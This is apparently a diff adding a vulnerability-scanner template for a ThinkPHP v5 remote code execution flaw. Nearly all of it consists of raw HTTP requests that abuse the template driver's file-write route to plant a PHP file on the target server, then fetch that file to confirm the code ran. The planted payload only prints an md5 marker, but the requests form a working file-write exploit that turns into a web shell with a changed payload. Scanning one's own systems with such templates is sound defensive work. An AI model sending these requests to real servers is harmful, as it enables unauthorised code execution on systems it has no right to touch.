@@ -1,0 +1,40 @@
+id: poc-local-thinkphp-v5-templalte-driver-rce
+
+info:
+  name: poc-local-thinkphp-v5-templalte-driver-rce
+  author: capiton
+  severity: critical
+  description: ""
+  reference: ""
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |+
+        GET /index.php?s=index/\think\template\driver\file/write&cacheFile={{randstr}}.php&content=%3C?php%20var_dump(md5({{randInt}}));?%3E HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /public/index.php?s=index/\think\template\driver\file/write&cacheFile={{randstr}}.php&content=%3C?php%20var_dump(md5({{randInt}}));?%3E HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /index.php?s=\think\template\driver\file/write&cacheFile={{randstr}}.php&content=%3C?php%20var_dump(md5({{randInt}}));?%3E HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
+
